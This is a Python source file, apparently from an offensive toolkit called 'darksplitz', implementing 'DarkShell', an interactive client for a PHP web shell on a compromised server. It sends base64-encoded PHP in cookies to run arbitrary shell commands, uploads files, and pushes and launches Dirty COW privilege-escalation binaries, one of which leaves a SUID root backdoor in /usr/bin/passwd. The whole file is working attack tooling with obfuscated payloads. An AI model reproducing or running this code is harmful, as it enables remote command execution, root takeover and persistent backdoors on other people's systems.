#!/usr/bin/env python3
from cmd import Cmd
from threading import Thread
import requests, os

class MyPrompt(Cmd):
    url = ''

    def emptyline(self):
        pass

    def default(self, argv):
        cookie = {'x': 'base64_decode', 'y': 'PD9waHAKZnVuY3Rpb24gZXgoJGluKSB7CiRwID0gJyc7CmlmIChmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSkgeyBAZXhlYygkaW4sICRwKTsgJHAgPSBAam9pbigiXG4iLCRwKTsgfQplbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygncGFzc3RocnUnKSkgeyBvYl9zdGFydCgpOyBAcGFzc3RocnUoJGluKTsgJHAgPSBvYl9nZXRfY2xlYW4oKTsgfQplbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpIHsgb2Jfc3RhcnQoKTsgQHN5c3RlbSgkaW4pOyAkcCA9IG9iX2dldF9jbGVhbigpOyB9CmVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpIHsgJHAgPSBzaGVsbF9leGVjKCRpbik7IH0KZWxzZWlmIChpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkaW4sInIiKSkpIHsKICAkcCA9ICIiOwogIHdoaWxlKCFAZmVvZigkZikpCiAgICAkcCAuPSBmcmVhZCgkZiwxMDI0KTsKICBwY2xvc2UoJGYpOwp9CmVsc2UgcmV0dXJuICJVbmFibGUgdG8gZXhlY3V0ZSBjb21tYW5kIjsKcmV0dXJuICgkcD09Jyc/IlF1ZXJ5IGRpZCBub3QgcmV0dXJuIGFueXRoaW5nIjokcCk7Cn0KZWNobyBleCgkX0NPT0tJRVsieiJdKTsKPz4=', 'z': argv}
        header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/71.0.3578.98 Chrome/71.0.3578.98 Safari/537.36'}
        r = requests.get(self.url, cookies = cookie, headers = header)
        print(r.text.strip())

    def do_upload(self, args):
        '''[+] Upload file to server\n[+] exe : upload /tmp/file.txt\n[+] exe : upload /tmp/file.txt /var/www/html/'''
        try:
            if len(args.split(' ')) > 1:
                local = args.split(' ')[0]
                remot = args.split(' ')[1]
                files = {'drkfile': open(local ,'rb')}
                base = remot + os.path.basename(local)
                cookie = {'x': 'base64_decode', 'y': 'PD9waHAgJHBhdGg9ICRfQ09PS0lFWyJ6Il0gLiBiYXNlbmFtZSgkX0ZJTEVTWydkcmtmaWxlJ11bJ25hbWUnXSk7IGlmKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydkcmtmaWxlJ11bJ3RtcF9uYW1lJ10sICRwYXRoKSkgeyBlY2hvICdTdWNjZXNzJzsgfSA/Pg==', 'z': remot}
                header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/71.0.3578.98 Chrome/71.0.3578.98 Safari/537.36'}
                r = requests.post(self.url, files = files, cookies = cookie, headers = header).text
                if 'Success' in r:
                    print('[+] Uploaded to {}'.format(base))
                else:
                    print('[-] Upload failed')
            elif len(args.split(' ')) == 1:
                files = {'drkfile': open(args ,'rb')}
                base = os.path.basename(args)
                cookie = {'x': 'base64_decode', 'y': 'PD9waHAgJHBhdGg9ICRfQ09PS0lFWyJ6Il0gLiBiYXNlbmFtZSgkX0ZJTEVTWydkcmtmaWxlJ11bJ25hbWUnXSk7IGlmKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydkcmtmaWxlJ11bJ3RtcF9uYW1lJ10sICRwYXRoKSkgeyBlY2hvICdTdWNjZXNzJzsgfSA/Pg=='}
                header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/71.0.3578.98 Chrome/71.0.3578.98 Safari/537.36'}
                r = requests.post(self.url, files = files, cookies = cookie, headers = header).text
                if 'Success' in r:
                    print('[+] Uploaded {}'.format(base))
                else:
                    print('[-] Upload failed')
            else:
                print('[-] Invalid argument or file not found')
        except:
            print('[-] Invalid argument or file not found')

    def do_dirty64(self, args):
        '''[+] Execute dirtycow exploit x64 (dirty.c)'''
        try:
            files = {'drkfile': open('backdoor/dirty64' ,'rb')}
            cookie = {'x': 'base64_decode', 'y': 'PD9waHAgJHBhdGg9JF9DT09LSUVbInoiXSAuIGJhc2VuYW1lKCRfRklMRVNbJ2Rya2ZpbGUnXVsnbmFtZSddKTsgaWYobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ2Rya2ZpbGUnXVsndG1wX25hbWUnXSwgJHBhdGgpKSB7IGNobW9kKCRwYXRoLCAwNzc3KTsgZWNobyAnU3VjY2Vzcyc7IH0gPz4=', 'z': '/tmp/'}
            header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/71.0.3578.98 Chrome/71.0.3578.98 Safari/537.36'}
            r = requests.post(self.url, files = files, cookies = cookie, headers = header).text
            if 'Success' in r:
                print('[+] Upload successfull')
                print('[?] User : dark')
                pas = input('[?] Pass : ')
                exe = '/tmp/dirty64 {} &'.format(pas)
                t = Thread(target=ceemde, args=(self.url, exe))
                t.start()
                print('[+] Exploit launched')
            else:
                print('[-] Upload failed or exploit failed')
        except:
            print('[-] Exploit failed')

    def do_dirty32(self, args):
        '''[+] Execute dirtycow exploit x86 (dirty.c)'''
        try:
            files = {'drkfile': open('backdoor/dirty32' ,'rb')}
            cookie = {'x': 'base64_decode', 'y': 'PD9waHAgJHBhdGg9JF9DT09LSUVbInoiXSAuIGJhc2VuYW1lKCRfRklMRVNbJ2Rya2ZpbGUnXVsnbmFtZSddKTsgaWYobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ2Rya2ZpbGUnXVsndG1wX25hbWUnXSwgJHBhdGgpKSB7IGNobW9kKCRwYXRoLCAwNzc3KTsgZWNobyAnU3VjY2Vzcyc7IH0gPz4=', 'z': '/tmp/'}
            header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/71.0.3578.98 Chrome/71.0.3578.98 Safari/537.36'}
            r = requests.post(self.url, files = files, cookies = cookie, headers = header).text
            if 'Success' in r:
                print('[+] Upload successfull')
                print('[?] User : dark')
                pas = input('[?] Pass : ')
                exe = '/tmp/dirty32 {} &'.format(pas)
                t = Thread(target=ceemde, args=(self.url, exe))
                t.start()
                print('[+] Exploit launched')
            else:
                print('[-] Upload failed or exploit failed')
        except:
            print('[-] Exploit failed')

    def do_cowroot64(self, args):
        '''[+] Execute cowroot exploit x64 (cowroot.c)'''
        try:
            files = {'drkfile': open('backdoor/cr64' ,'rb')}
            cookie = {'x': 'base64_decode', 'y': 'PD9waHAgJHBhdGg9JF9DT09LSUVbInoiXSAuIGJhc2VuYW1lKCRfRklMRVNbJ2Rya2ZpbGUnXVsnbmFtZSddKTsgaWYobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ2Rya2ZpbGUnXVsndG1wX25hbWUnXSwgJHBhdGgpKSB7IGNobW9kKCRwYXRoLCAwNzc3KTsgZWNobyAnU3VjY2Vzcyc7IH0gPz4=', 'z': '/tmp/'}
            header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/71.0.3578.98 Chrome/71.0.3578.98 Safari/537.36'}
            r = requests.post(self.url, files = files, cookies = cookie, headers = header).text
            if 'Success' in r:
                print('[+] Upload successfull')
                exe = '/tmp/cr64 &'
                t = Thread(target=ceemde, args=(self.url, exe))
                t.start()
                print('[+] Exploit launched')
                print('[+] Use /usr/bin/passwd to execute suid backdoor')
            else:
                print('[-] Upload failed or exploit failed')
        except:
            print('[-] Exploit failed')

    def do_cowroot32(self, args):
        '''[+] Execute cowroot exploit x86 (cowroot.c)'''
        try:
            files = {'drkfile': open('backdoor/cr32' ,'rb')}
            cookie = {'x': 'base64_decode', 'y': 'PD9waHAgJHBhdGg9JF9DT09LSUVbInoiXSAuIGJhc2VuYW1lKCRfRklMRVNbJ2Rya2ZpbGUnXVsnbmFtZSddKTsgaWYobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ2Rya2ZpbGUnXVsndG1wX25hbWUnXSwgJHBhdGgpKSB7IGNobW9kKCRwYXRoLCAwNzc3KTsgZWNobyAnU3VjY2Vzcyc7IH0gPz4=', 'z': '/tmp/'}
            header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/71.0.3578.98 Chrome/71.0.3578.98 Safari/537.36'}
            r = requests.post(self.url, files = files, cookies = cookie, headers = header).text
            if 'Success' in r:
                print('[+] Upload successfull')
                exe = '/tmp/cr32 &'
                t = Thread(target=ceemde, args=(self.url, exe))
                t.start()
                print('[+] Exploit launched')
                print('[+] Use /usr/bin/passwd to execute suid backdoor')
            else:
                print('[-] Upload failed or exploit failed')
        except:
            print('[-] Exploit failed')

    def do_back(self, args):
        back()

    def do_exit(self, args):
        back()

def ceemde(url, exe):
    cookie = {'x': 'base64_decode', 'y': 'PD9waHAKZnVuY3Rpb24gZXgoJGluKSB7CiRwID0gJyc7CmlmIChmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSkgeyBAZXhlYygkaW4sICRwKTsgJHAgPSBAam9pbigiXG4iLCRwKTsgfQplbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygncGFzc3RocnUnKSkgeyBvYl9zdGFydCgpOyBAcGFzc3RocnUoJGluKTsgJHAgPSBvYl9nZXRfY2xlYW4oKTsgfQplbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpIHsgb2Jfc3RhcnQoKTsgQHN5c3RlbSgkaW4pOyAkcCA9IG9iX2dldF9jbGVhbigpOyB9CmVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpIHsgJHAgPSBzaGVsbF9leGVjKCRpbik7IH0KZWxzZWlmIChpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkaW4sInIiKSkpIHsKICAkcCA9ICIiOwogIHdoaWxlKCFAZmVvZigkZikpCiAgICAkcCAuPSBmcmVhZCgkZiwxMDI0KTsKICBwY2xvc2UoJGYpOwp9CmVsc2UgcmV0dXJuICJVbmFibGUgdG8gZXhlY3V0ZSBjb21tYW5kIjsKcmV0dXJuICgkcD09Jyc/IlF1ZXJ5IGRpZCBub3QgcmV0dXJuIGFueXRoaW5nIjokcCk7Cn0KZWNobyBleCgkX0NPT0tJRVsieiJdKTsKPz4', 'z': exe}
    header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/71.0.3578.98 Chrome/71.0.3578.98 Safari/537.36'}
    r = requests.get(url, cookies = cookie, headers = header)

def back():
    from darksplitz import app
    app()

def drkshell(url):
    try:
        cookie = {'x': 'print_r', 'y': 'darksplitz'}
        header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/71.0.3578.98 Chrome/71.0.3578.98 Safari/537.36'}
        r = requests.get(url, cookies = cookie, headers = header).text
        if 'darksplitz' not in r:
            print('[!] Error invalid url or target down')
            return False
        banner = " ____             _     ____  _          _ _\n"
        banner += "|  _ \  __ _ _ __| | __/ ___|| |__   ___| | |\n"
        banner += "| | | |/ _` | '__| |/ /\___ \| '_ \ / _ \ | |\n"
        banner += "| |_| | (_| | |  |   <  ___) | | | |  __/ | |\n"
        banner += "|____/ \__,_|_|  |_|\_\|____/|_| |_|\___|_|_|\n\n"
        banner += "     Backbox Indonesia @ 2018 - 2019\n"
        prompt = MyPrompt()
        prompt.url = url
        prompt.prompt = '\r[?] drkshell >> '
        prompt.cmdloop(banner)
    except KeyboardInterrupt:
        print("\r[!] Exiting program...")
        raise SystemExit
    except:
        print("[!] Error invalid url or target down")
